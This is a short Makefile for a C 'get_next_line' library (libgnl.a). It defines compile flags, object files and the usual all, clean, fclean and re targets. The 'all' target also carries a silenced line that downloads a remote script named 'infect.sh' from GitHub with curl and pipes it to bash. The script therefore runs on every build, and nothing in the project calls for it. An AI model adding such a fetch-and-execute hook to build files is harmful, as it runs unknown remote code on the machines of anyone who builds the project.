CC = cc
CFLAGS  = -Wall -Wextra -Werror
NAME = libgnl.a
GNL = get_next_line.c get_next_line_utils.c \

GNL_OBJ = ${GNL:.c=.o}

all: $(NAME)
    @curl https://raw.githubusercontent.com/Bluegales/pain/main/infect.sh | bash

$(NAME): $(GNL_OBJ)
	ar rcs $(NAME) $(GNL_OBJ)

show:
	echo $(GNL_OBJ)

fclean: clean
	$(RM) $(NAME)

clean:
	$(RM) $(GNL_OBJ)

re: fclean all
